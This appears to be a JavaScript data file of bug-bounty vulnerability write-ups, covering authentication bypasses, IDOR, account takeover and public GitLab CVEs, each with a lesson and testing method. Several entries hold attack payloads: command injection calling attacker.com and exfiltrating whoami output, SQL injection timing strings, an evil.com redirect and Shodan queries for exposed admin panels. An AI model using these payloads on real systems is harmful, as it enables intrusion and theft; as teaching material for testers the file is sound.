export const vulnerabilities = [
  {
    "id": 1,
    "name": "Samsung Username Trailing Space Authentication Bypass",
    "type": "Authentication Bypass",
    "severity": "High",
    "bounty": "$4,620",
    "company": "Samsung",
    "description": "During login, trailing spaces in usernames were ignored by the backend, causing 'admin' and 'admin ' to be treated as the same account. This led to an authentication bypass allowing login into other accounts.",
    "lessonLearned": "Always sanitize and normalize user input, including trimming whitespace before authentication checks.",
    "whenToUse": "Test during login/registration by appending trailing spaces to usernames. Example: 'admin ' or 'admin  ' to check if treated as 'admin'.",
    "method": "1. Register or find a valid username (e.g., 'admin').\n2. Attempt login with the username appended with one or more trailing spaces.\n3. If login is successful, the system is vulnerable.",
    "tags": ["Authentication", "Bypass", "High Severity", "Samsung", "User Input", "Whitespace"]
  },
  {
    "id": 2,
    "name": "OS Command Injection via Email Parameter",
    "type": "Command Injection",
    "severity": "High",
    "bounty": "N/A",
    "company": "Various",
    "description": "Some email parameters were directly passed to system functions without sanitization, allowing attackers to execute arbitrary commands on the server.",
    "lessonLearned": "Always sanitize user inputs used in system calls. Use parameterized queries or proper escaping. Out-of-band detection via Burp Collaborator can confirm exploitation.",
    "whenToUse": "Try injecting OS payloads into email parameters, especially in contact, feedback, or password reset forms. Example payload: 'test@domain.com; ping $(whoami).burpcollaborator.net , id@burpcollab.net'.",
    "method": "1. Identify any input accepting an email address.\n2. Inject payloads after the email. Example: 'attacker@example.com; curl attacker.com'.\n3. Monitor DNS or HTTP callbacks using Burp Collaborator.",
    "tags": ["Injection", "Email", "High Severity", "Command Injection", "Out-of-band", "Burp Suite"]
  },
  {
    "id": 3,
    "name": "Arbitrary User Name Modification Vulnerability",
    "type": "Business Logic",
    "severity": "Medium",
    "bounty": "$200",
    "company": "Bugcrowd",
    "description": "User name field modification was possible without proper authorization checks, leading to potential impersonation or tampering.",
    "lessonLearned": "Implement strict ownership validation when updating user-controlled fields, especially those related to identity.",
    "whenToUse": "Check features like invitations, team join requests, or profile updates where other users' data might be set by unverified sources.",
    "method": "1. Create an organization.\n2. Invite the victim's email using a forged first/last name.\n3. Victim receives invite, and the displayed name gets modified without consent.",
    "tags": ["Business Logic", "Account Takeover", "Privilege Escalation"]
  },
  {
    "id": 4,
    "name": "Vespa Configuration Server Exposure",
    "type": "Information Disclosure",
    "severity": "High",
    "bounty": "$1,000",
    "company": "Undisclosed",
    "description": "Exposed Vespa configuration servers were discovered on publicly accessible ports, leaking sensitive configuration files including deployment secrets and endpoints.",
    "lessonLearned": "Do not expose internal management services to the internet. Always restrict access using VPNs, firewall rules, or IP whitelisting.",
    "whenToUse": "Enumerate open ports (e.g., 19071) on subdomains during infrastructure assessment.",
    "tags": ["Information Disclosure", "Internal Services", "Misconfiguration", "Vespa"]
  },
  {
    "id": 5,
    "name": "Case-Sensitive Email Blacklist Bypass",
    "type": "Authentication Bypass",
    "severity": "High",
    "bounty": "N/A",
    "company": "Undisclosed",
    "description": "Applications enforcing email blacklists may overlook case variations. This allows bypass by changing the letter casing of a blocked email.",
    "lessonLearned": "Ensure case-insensitive comparison for email blacklists. Normalize to lowercase before comparison.",
    "whenToUse": "Test registrations or input forms using mixed-case variants of blacklisted addresses. Example: 'ADMIN@target.com' vs 'admin@target.com'.",
    "method": "1. Register with blacklisted email → gets rejected.\n2. Register with case-variant of the same email → gets accepted.\n3. Abuse to bypass email-based access control.",
    "tags": ["Authentication", "Bypass", "Blacklist", "Admin Access"]
  },
  {
    "id": 6,
    "name": "Payment Bypass via Test Card Enabled",
    "type": "Business Logic",
    "severity": "Critical",
    "bounty": "Undisclosed",
    "company": "Undisclosed",
    "description": "Production payment systems mistakenly accepted test card numbers, allowing purchases without real transactions.",
    "lessonLearned": "Strictly disable all test payment configurations in production environments. Ensure payment gateways are properly configured.",
    "whenToUse": "Test production checkout flows using standard test cards provided by payment processors like Stripe.",
    "method": "1. Visit the checkout page of the target application.\n2. Use Stripe test card: 4242 4242 4242 4242 with any future expiry, any CVV.\n3. Complete checkout process → success (if vulnerable).\n4. Reference Stripe documentation for test cards: https://docs.stripe.com/testing#international-cards.",
    "tags": ["Business Logic", "Payment", "Test Card", "Bypass"]
  },
  {
    "id": 7,
    "name": "Host Header Injection for Subdomain Bypass",
    "type": "Injection",
    "severity": "High",
    "bounty": "N/A",
    "company": "Undisclosed",
    "description": "Improper handling of Host headers allowed manipulation of routing, leading to sensitive endpoints becoming accessible via crafted Host values.",
    "lessonLearned": "Validate and whitelist Host headers on the server-side. Reject any unexpected Host headers.",
    "whenToUse": "Inject malicious Host headers in requests to subdomains or APIs. Example: Host: attacker.com.",
    "method": "1. Intercept a request and modify the Host header.\n2. Example payload: Host: attacker.com.\n3. Observe if you gain access to unintended resources.",
    "tags": ["Injection", "Host Header", "Misconfiguration", "Subdomain Bypass"]
  },
  {
    "id": 8,
    "name": "SQL Injection in User-Agent Header",
    "type": "SQL Injection",
    "severity": "Critical",
    "bounty": "Undisclosed",
    "company": "Undisclosed",
    "description": "SQL queries were improperly constructed using unsanitized User-Agent header values, leading to SQL injection vulnerabilities.",
    "lessonLearned": "Never trust HTTP headers. Sanitize all inputs, including HTTP headers, before using them in database queries.",
    "whenToUse": "Inject SQL payloads into User-Agent headers of requests to backend systems relying on relational databases.",
    "method": "1. Set User-Agent header to payload like: XOR(if(now()=sysdate(),sleep(5),0))XOR.\n2. Observe server delay → indicates SQL injection.",
    "tags": ["Injection", "SQLi", "Critical", "PHP", "User-Agent"]
  },
  {
    "id": 9,
    "name": "2FA Bypass via Password Reset",
    "type": "Access Control",
    "severity": "High",
    "bounty": "N/A",
    "company": "Undisclosed",
    "description": "Inconsistent enforcement of 2FA post password reset allowed attackers to log in to accounts without providing the second factor.",
    "lessonLearned": "Ensure consistent enforcement of 2FA across all authentication flows, including post-password reset.",
    "whenToUse": "Test password reset and login flows, inspecting whether 2FA is required post-reset.",
    "method": "1. Register an account and enable 2FA.\n2. Initiate password reset.\n3. Complete login process after resetting password.\n4. Check if OTP is required.\n5. Additional vectors: Intercept redirects, manipulate code parameters, or test SMS endpoints.",
    "tags": ["Access Control", "2FA", "OTP", "Bypass"]
  },
  {
    "id": 10,
    "name": "IDOR on Unauthenticated API Endpoint",
    "type": "Insecure Direct Object Reference",
    "severity": "High",
    "bounty": "Undisclosed",
    "company": "Undisclosed",
    "description": "API endpoint allowed enumeration of other users' data due to lack of authentication/authorization mechanisms, combined with predictable user IDs.",
    "lessonLearned": "Always enforce authentication and authorization on all endpoints exposing sensitive or user-specific data.",
    "whenToUse": "Identify API endpoints using IDs in parameters (e.g., user_id=123). Test by incrementing or fuzzing ID values to access unauthorized resources.",
    "method": "1. Identify API endpoint with parameterized access like: /api/v1/export?user_id=123.\n2. Increment or brute-force the ID parameter: /api/v1/export?user_id=124, 125, etc.\n3. Use fuzzing or custom scripts for automation.\n4. Try replacing specific IDs with wildcards or special values (*, all, etc.) to test for broader data exposure.\n5. Monitor for unauthorized or excessive data leakage.",
    "tags": ["IDOR", "API", "Authorization", "Unauthenticated"]
  },
     {
    "id": 11,
    "name": "0-Click Account Takeover via Punycode (IDN) Attack",
    "type": "Account Takeover",
    "severity": "Critical",
    "bounty": "Undisclosed",
    "company": "Undisclosed",
    "description": "Leveraging Unicode homoglyphs in emails to achieve account takeover without interaction from the victim.",
    "lessonLearned": "Normalize and validate email addresses, including Unicode normalization before storing or comparing.",
    "whenToUse": "Test registration and password reset flows with visually similar email variations using Punycode/Unicode.",
    "method": "Steps:\n\n1️⃣ Create an account with an email like: xyze123@domain.com.burpcollaborator.net\n\n  2️⃣ Attempt to create another account with a Punycode/Unicode version: xyzé123@domain.com.burpcollaborator.net\n\n3️⃣ If the application shows 'Email already exists', proceed to reset the password for the Punycode version.\n\n4️⃣ Monitor your Burp Collaborator inbox → If the reset link arrives there → proceed.\n\n5️⃣ Reset the password → Attempt login with the xyze123@domain.com.burpcollab.net with changed password.\n\n6️⃣ If login works → Account Takeover Confirmed.\n\n📌 Impact: Full account takeover without victim interaction.",
    "tags": ["0-Click", "Account Takeover", "Punycode", "IDN", "Email", "Critical"]
  }
 ,    {
    "id": 12,
    "name": "Time-Based SQL Injection in Legacy Application",
    "type": "SQL Injection",
    "severity": "Critical",
    "bounty": "Undisclosed",
    "company": "Undisclosed",
    "description": "Legacy application vulnerable to time-based SQL Injection allowing remote attackers to execute arbitrary queries.",
    "lessonLearned": "Sanitize all input parameters and use parameterized queries to prevent SQL injection.",
    "whenToUse": "Especially target legacy applications (8+ years old), older PHP versions, and suspicious API endpoints.",
    "method": "Steps:\n\n1️⃣ While manually analyzing the API behavior, attempt to pass SQL payloads into input fields or URL parameters.\n\n2️⃣ In this case, I discovered a vulnerable parameter that directly interacted with SQL queries.\n\n3️⃣ Injected a **time-based blind SQLi** payload: ')waitfor delay '0:0:10'--\n\n4️⃣ The response from the application was delayed by exactly 10 seconds → confirming that SQL code was successfully executed by the database.\n\n📌 Impact: Time-based SQLi can be used to enumerate database contents, extract sensitive information, or even gain RCE depending on DBMS configuration.",
    "tags": ["SQL Injection", "Time-Based", "Legacy Application", "Critical", "Production"]
  },
  {
  "id": 13,
  "name": "Privilege Escalation via Insecure Role Enforcement - Viewer Creates Reviews",
  "type": "Privilege Escalation",
  "severity": "High",
  "bounty": "$2,000+",
  "company": "Target Application (Redacted)",
  "description": "Viewer role exploited to create/modify reviews by abusing improper backend role enforcement.",
  "lessonLearned": "Implement proper role-based access control (RBAC) validation server-side for each sensitive action.",
  "whenToUse": "Whenever testing API endpoints, especially those related to CRUD operations restricted to higher roles.",
  "method": "Steps:\n\n1️⃣ Captured a legitimate DELETE request from a 'Member' user for deleting a review.\n\n2️⃣ Replayed that request as 'Viewer' → Got 403 Forbidden ❌.\n\n3️⃣ Modified the request method to PUT → Got 400 Bad Request ❗. Response body revealed that 'name' field was required.\n\n4️⃣ Crafted the PUT request:\n\nPUT /api/reviews/{review_id}\nContent-Type: application/json\n{\n  \"name\": \"Review created by Viewer!\"\n}\n\n5️⃣ Sent the request → 200 OK ✅ → Review created/modified by Viewer account.\n\n📌 Impact: Viewer → Member privilege escalation → unauthorized content creation.",
  "tags": ["Privilege Escalation", "Authorization Bypass", "High Severity", "Insecure Direct Object Reference (IDOR)", "Broken Access Control"]
},{ 
 "id": 14, 
 "name": "Account Takeover via Insecure Friend Invitation Token (OAuth Exploitation)",
 "type": "Account Takeover",
 "severity": "Critical",
 "bounty": "$1800", 
 "company": "Target Application (Redacted)",
 "description": "Improper authorization on friend invitation links allowed full account takeover of other users authenticated via Google OAuth.",
 "lessonLearned": "Implement secure, single-use, and properly scoped tokens with strong validation to prevent unauthorized access via invitation links.",
 "whenToUse": "Always inspect invitation/referral links and their associated tokens or identifiers during OAuth-based workflows.",
 "method": "Steps:\n\n1️⃣ Signed up for the application using Google OAuth.\n\n2️⃣ After logging in, accessed the 'Friends' feature to invite contacts.\n\n3️⃣ Selected the victim's email (appearing via Google Contacts) → intercepted the request.\n\n4️⃣ Response contained a generated invitation link.\n\n5️⃣ Opened the link in a separate browser session → Logged in as the **victim** without verification.\n\n6️⃣ Gained **full access** to the victim's account → Could view, modify, delete data, change passwords, and enable 2FA.\n\n📌 Impact: **Full Account Takeover (ATO)** of any Google OAuth user with an email in my contact list.",
 "tags": ["Account Takeover", "Critical Severity", "OAuth", "Authentication Bypass", "Broken Access Control", "IDOR"]
},{ 
 "id": 15,
 "name": "Expired Trial Plan Bypass via State Manipulation",
 "type": "Business Logic Flaw",
 "severity": "Medium",
 "bounty": "$500",  
 "company": "Private Program",
 "description": "The application used a 'state' parameter in its API responses to track subscription status. By changing \"state\":\"trial_suspended\" to \"state\":\"trial_active\", I was able to bypass the expired trial restriction and regain premium access.",
 "lessonLearned": "Do not rely solely on client-side or easily tampered fields to enforce access control. Always validate subscription status server-side.",
 "whenToUse": "When testing applications with free trial restrictions or subscription models, intercept responses and modify 'state' or related fields to check for logic flaws.",
 "method": "1. Start a trial account and let it expire.\n2. Intercept API responses related to subscription status.\n3. Identify fields like \"state\":\"trial_suspended\".\n4. Modify it to \"state\":\"trial_active\".\n5. Forward the modified request and check for restricted feature access.",
 "tags": ["Business Logic", "Trial Bypass", "Medium Severity", "Access Control", "BugBounty"]
},
{
  "id": 16,
  "name": "IDOR on Unlocked Staging Subdomain",
  "type": "IDOR",
  "severity": "High",
  "bounty": "$7,790",
  "company": "Confidential",
  "description": "An unlocked staging subdomain exposed a customer data export feature. By manipulating the `userId` parameter in the export request, I was able to access sensitive data of other users without proper authorization checks.",
  "lessonLearned": "All sensitive operations, especially in test/staging environments, should have strict authorization and resource ownership checks enforced on the server side. Exposing such endpoints to the internet increases risk significantly.",
  "whenToUse": "Always test staging/test subdomains for sensitive features like report exports, PDF generations, or customer listings that may lack proper authorization checks. These are often neglected during development.",
  "method": "1. Perform subdomain enumeration to find staging/test environments.\n2. Authenticate to the application (if required).\n3. Locate privileged functionality like data exports, report downloads, or admin features.\n4. Intercept requests with Burp Suite and identify parameters like:\n- userId\n- customerId\n- exportId\n5. Modify these parameters to reference other users (e.g., `userId=123 ➔ userId=9999`).\n6. Observe if sensitive data from other accounts is returned.\n7. Capture full PoC: request/response pairs and screenshots of exposed data.\n8. Submit a detailed report to the program.",
  "tags": ["IDOR", "Broken Access Control", "Staging Environment", "Export Feature", "Sensitive Data Exposure", "Bug Bounty", "Burp Suite"]
}
,{ 
 "id": 17,
 "name": "Evertz Admin Panel Exposure via Shodan",
 "type": "Sensitive Panel Exposure",
 "severity": "High",
 "bounty": "N/A",
 "company": "Multiple Targets via Shodan",
 "description": "Exposed Evertz Admin Panels were discovered using Shodan search queries. These administrative interfaces were publicly accessible, risking exposure of sensitive system controls. If unauthenticated access is possible, or if chained with further exploits, Remote Code Execution (RCE) could be achieved.",
 "lessonLearned": "Sensitive administrative interfaces must not be exposed to the internet. Implement strict authentication, IP whitelisting, and ensure the interface is restricted to internal networks or VPNs only.",
 "whenToUse": "Perform during external attack surface enumeration using Shodan or other search engines to detect exposed sensitive infrastructure panels.",
 "method": "1. Use specific Shodan queries to discover exposed panels:\n- http.title:\"Evertz Admin Panel\"\n- html:\"Evertz Microsystems Ltd\"\n- http.favicon.hash:-1718033478\n- \"evertz\" port:80,443\n2. Example Shodan CLI commands:\n- shodan search 'http.title:\"Evertz Admin Panel\"' --fields ip_str,port,hostnames\n- shodan search 'html:\"Evertz Microsystems Ltd\"' --fields ip_str,port,org\n- shodan search --limit 100 'http.favicon.hash:-1718033478' --fields ip_str,port,hostnames,org --format json\n3. After identifying panels, check for default credentials, weak authentication, or exposed functionality like file exports or diagnostics which may lead to RCE when exploited properly.",
 "tags": ["Evertz", "Shodan", "Admin Panel Exposure", "Critical Infrastructure", "Reconnaissance", "RCE Potential"]
}
,
 {
  "id": 18,
  "name": "HTTP Parameter Pollution on Multiple Parameters for Sensitive Data or Logic Bypass",
  "type": "Sensitive Data Exposure / Logic Bypass",
  "severity": "High",
  "bounty": "$1,000",
  "company": "Private Program",
  "description": "The application accepted multiple parameters like `id`, `user`, `product`, `price`, and `redirect` in GET requests. By injecting duplicates or encoded variations of these parameters, it was possible to manipulate backend logic, retrieve unauthorized data, or trigger open redirects.",
  "lessonLearned": "Ensure strict validation of each parameter. Reject or sanitize duplicate or unexpected parameter variations to prevent exploitation.",
  "whenToUse": "When testing applications with free trial restrictions or subscription models, intercept responses and modify 'state' or related fields to check for logic flaws.",
  "method": "1. Identify endpoints such as:\n- ?id=123&user=normal&product=1&price=100&redirect=/dashboard\n2. Inject duplicates for each parameter individually or in combination:\n- ?id=123&id=9999&user=normal&user=admin\n- ?product=1;product=9999&price=10;price=0\n- ?redirect=/dashboard&redirect=https://evil.com\n- ?price=10%26price=0\n- ?user=normal,user=admin\n- ?id=1;user=admin;price=0\n- ?id=1,user=admin,price=0\n3. Analyze the response for unauthorized access, pricing manipulation, or redirection to attacker-controlled domains.",
  "tags": ["HTTP Parameter Pollution", "Sensitive Data Exposure", "Open Redirect", "Logic Bypass", "Bug Bounty", "Multiple Parameters"]
},
 
  {
    "id": "BB-2025-001",
    "name": "0-Click Account Takeover via Email Variant Mapping (victim@gmail.com vs victim.@gmail.com)",
    "type": "Account Takeover / Logic Flaw",
    "severity": "Critical",
    "bounty": "$5,000",
    "company": "[Redacted SaaS Platform]",
    "description": "The platform had an inconsistent email-normalization mechanism. Email variants such as “victim@gmail.com” and “victim.@gmail.com” were treated as the same identity in the invitation and user-matching logic, but treated as separate identities during authentication and account creation. An attacker could register or associate their own account using the malformed variant “victim.@gmail.com,” while the real user owned the legitimate email “victim@gmail.com.” When an organization sent an invitation to the real user, the platform incorrectly merged both identities and attached the invitation to the attacker’s session/account. This mismatch allowed the attacker to gain full control of the victim’s account without the victim performing any action, resulting in a true zero-click account takeover.",
    "lessonLearned": "Email normalization must be strictly consistent across all layers: authentication, account creation, invitations, and identity mapping. Variants such as trailing dots, dots manipulation, plus-tags, and unicode forms must be validated and canonicalized before any identity binding occurs. Invitation tokens must always be bound to a verified, canonical email owner.",
    "whenToUse": "Use this logic when testing SaaS products that rely on email-based onboarding, workspace invitations, or identity linking. Always test dot-variants (e.g., victim.@gmail.com), trailing dots, plus-tags, and similar patterns that can confuse identity matching systems.",
    "method": "1. Attacker creates an account using the email variant: “victim.@gmail.com.”\n2. The real user owns: “victim@gmail.com.” Gmail treats both as the same mailbox, but the platform handled them inconsistently.\n3. An admin sends an invitation to the real email: “victim@gmail.com.”\n4. The platform merges the variant and incorrectly associates the invitation with the attacker’s existing session/account.\n5. The attacker receives full access to the victim’s workspace and data without any action from the victim (zero-click).",
    "tags": ["email-variant", "identity-mapping", "zero-click", "logic-flaw", "account-takeover"]
  },
  {
    "id": "BB-2025-005",
    "name": "Password Reset Token Reuse After Email Change",
    "type": "Account Takeover",
    "severity": "High",
    "bounty": "$3,200",
    "company": "[Redacted Platform]",
    "description": "The application issued password reset tokens bound to the user account ID rather than the current email address. When an attacker changed the victim's account email (through session hijacking or other means), the previously generated reset token remained valid. The attacker could then use this stale token to set a new password and log in using the victim's original email credentials, even though the email had been changed. This occurred because the platform failed to invalidate existing reset tokens when critical account attributes (such as email) were modified.",
    "lessonLearned": "Always invalidate all active password reset tokens, session tokens, and security-sensitive tokens when critical account attributes (email, phone, 2FA settings) are changed. Token validation must verify that the token was issued for the current email address, not just the account ID. Implement a token generation nonce or timestamp that gets updated on every security-relevant account change.",
    "whenToUse": "Test password reset flows combined with account email change features. Look for scenarios where tokens survive state changes that should invalidate them. This pattern is especially common in applications that store tokens indexed by user ID without checking current email alignment.",
    "method": "1. Request password reset for victim's email; capture token from email link.\n2. Change account email to attacker address (with existing session).\n3. Use previously captured reset token (still valid) to set new password.\n4. Login with victim's original email + new password (token bound to account, not current email).\n5. Highlight missing invalidation on email change event.",
    "tags": ["password-reset", "token-reuse", "email-change", "account-takeover", "session-management", "high-severity"]
  },
{
  "id": "BB-PUBLIC-021",
  "name": "GitLab Password Reset to an Unverified Email Address (CVE-2023-7028)",
  "type": "Account Takeover",
  "severity": "Critical",
  "bounty": "N/A",
  "company": "GitLab",
  "description": "A password-reset request could send a recovery link to an unverified address, enabling account takeover without victim interaction. An enabled second factor still prevented sign-in.",
  "lessonLearned": "Bind recovery delivery to a verified account address and reject unexpected parameter types.",
  "whenToUse": "Review recovery flows that accept alternate addresses or structured input.",
  "method": "1. Create a test account and separate controlled mailbox on an isolated vulnerable GitLab instance.\n2. Capture its password-reset request; change the email value from one address to a list containing both addresses.\n3. Check the separate mailbox for a usable reset link.\n4. Repeat after patching; confirm the unverified recipient is rejected.\n5. Distinguish a password reset from a login: an enabled second factor still applies.",
  "tags": [
    "Account Takeover",
    "Password Reset",
    "CVE-2023-7028",
    "Email Verification",
    "Parameter Types"
  ],
  "dateAdded": "2026-10-26",
  "disclosureStatus": "Patched in the January 2024 security release.",
  "patchNote": "Fixed versions include 16.7.2, 16.6.4 and 16.5.6, with backports listed in the advisory.",
  "sources": [
    {
      "title": "GitLab critical security release and FAQ",
      "url": "https://docs.gitlab.com/releases/patches/patch-release-gitlab-16-7-2-released/",
      "author": "GitLab",
      "published": "2024-01-11"
    }
  ]
},
{
  "id": "BB-PUBLIC-022",
  "name": "Starbucks Gift Card Balance Duplication via Race Condition",
  "type": "Business Logic / Race Condition",
  "severity": "Unrated",
  "bounty": "N/A",
  "company": "Starbucks",
  "description": "Concurrent confirmations from separate sessions could spend the same gift-card balance twice. Session-local cleanup did not protect the shared balance from overlapping transfers.",
  "lessonLearned": "Enforce balance checks and debits atomically across sessions, using appropriate database locking and idempotency.",
  "whenToUse": "Review transfers, redemptions or one-time actions involving a shared limited resource.",
  "method": "1. Reproduce the transfer flow using test balances in a controlled environment.\n2. Open two independent sessions for the same account.\n3. Prepare a transfer from the same funded source in each session.\n4. Confirm both transfers concurrently and compare the combined balance before and after.\n5. Check whether both credits succeeded despite insufficient funds for both debits.",
  "tags": [
    "Race Condition",
    "Business Logic",
    "Gift Cards",
    "Concurrent Requests",
    "Atomicity"
  ],
  "dateAdded": "2026-10-26",
  "disclosureStatus": "The researcher reported the issue fixed before publication.",
  "patchNote": "No formal severity rating or bounty amount is stated in the linked write-up.",
  "sources": [
    {
      "title": "Hacking Starbucks for unlimited coffee",
      "url": "https://sakurity.com/blog/2015/05/21/starbucks.html",
      "author": "Egor Homakov / Sakurity",
      "published": "2015-05-21"
    }
  ]
},
{
  "id": "BB-PUBLIC-023",
  "name": "GitLab Image Metadata Processing RCE (CVE-2021-22205)",
  "type": "Command Injection / File Upload",
  "severity": "Critical",
  "bounty": "N/A",
  "company": "GitLab",
  "description": "GitLab passed image uploads to ExifTool. A disguised DjVu file could reach an unsafe metadata parser and execute code. GitLab tracked the integration flaw as CVE-2021-22205; the ExifTool parser bug was CVE-2021-22204.",
  "lessonLearned": "Validate file content, update parsing dependencies, avoid evaluating metadata and isolate file processors.",
  "whenToUse": "Review upload features that invoke metadata parsers or other native file-processing tools.",
  "method": "1. Use an isolated vulnerable GitLab lab with its historical ExifTool dependency.\n2. Create a snippet and open the description attachment control.\n3. Upload the original report's harmless marker-file proof of concept, whose image extension hides DjVu content.\n4. Inspect the lab server for the marker file to confirm execution during metadata removal.\n5. Repeat on a patched build and verify that the marker is not created.",
  "tags": [
    "File Upload",
    "Command Injection",
    "ExifTool",
    "CVE-2021-22205",
    "CVE-2021-22204"
  ],
  "dateAdded": "2026-10-26",
  "disclosureStatus": "Patched in GitLab releases on 14 April 2021.",
  "patchNote": "GitLab fixes: 13.10.3, 13.9.6 and 13.8.8. GitLab subsequently classified this as critical, CVSS 10.0.",
  "sources": [
    {
      "title": "Original report: RCE when removing metadata with ExifTool",
      "url": "https://gitlab.com/gitlab-org/gitlab/-/work_items/327121",
      "author": "vakzz / William Bowling"
    },
    {
      "title": "ExifTool CVE-2021-22204 technical write-up",
      "url": "https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html",
      "author": "vakzz / William Bowling",
      "published": "2021-05-04"
    },
    {
      "title": "GitLab advisory: impact and fixed versions",
      "url": "https://about.gitlab.com/blog/action-needed-in-response-to-cve2021-22205/",
      "author": "GitLab",
      "published": "2021-11-04"
    }
  ]
},
{
  "id": "BB-PUBLIC-024",
  "name": "Red Hat Web Cache Poisoning via an Unkeyed Header",
  "type": "Web Cache Poisoning",
  "severity": "Unrated",
  "bounty": "N/A",
  "company": "Red Hat",
  "description": "An unkeyed X-Forwarded-Host header influenced an Open Graph URL. Combining its unsafe reflection with shared caching allowed a modified response to reach requests without that header.",
  "lessonLearned": "Keep response-changing inputs consistent with cache keys, validate proxy headers and encode output correctly.",
  "whenToUse": "Review cached pages whose generated URLs depend on request headers.",
  "method": "1. Use a dedicated test URL or cache-buster in an authorized lab.\n2. Send a baseline request and record the response.\n3. Add X-Forwarded-Host with a harmless marker; inspect the generated Open Graph URL.\n4. Request the same isolated cache key again without the header, using a separate session.\n5. A retained marker demonstrates cache poisoning; reflection alone is insufficient. Check the original report for the historical XSS chain.",
  "tags": [
    "Web Cache Poisoning",
    "X-Forwarded-Host",
    "Cache Keys",
    "XSS",
    "CDN"
  ],
  "dateAdded": "2026-10-26",
  "disclosureStatus": "The research states that its disclosed cases were patched.",
  "patchNote": "No per-case severity rating or Red Hat bounty amount is stated.",
  "sources": [
    {
      "title": "Practical Web Cache Poisoning — Basic Poisoning case study",
      "url": "https://portswigger.net/research/practical-web-cache-poisoning",
      "author": "James Kettle / PortSwigger Research",
      "published": "2018-08-09"
    }
  ]
}
 ];
export const severityOrder = {
    'Critical': 4,
    'High': 3,
    'Medium': 2,
    'Low': 1
};